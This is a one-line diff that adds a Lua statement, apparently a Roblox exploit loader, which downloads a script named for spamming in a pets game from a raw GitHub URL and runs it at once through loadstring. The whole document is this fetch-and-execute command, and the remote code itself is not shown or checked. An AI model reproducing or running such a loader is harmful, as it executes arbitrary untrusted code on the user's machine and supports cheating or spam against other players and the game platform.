@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/pets-universe-spam7-ku8crudnifk7tn.lua"))()
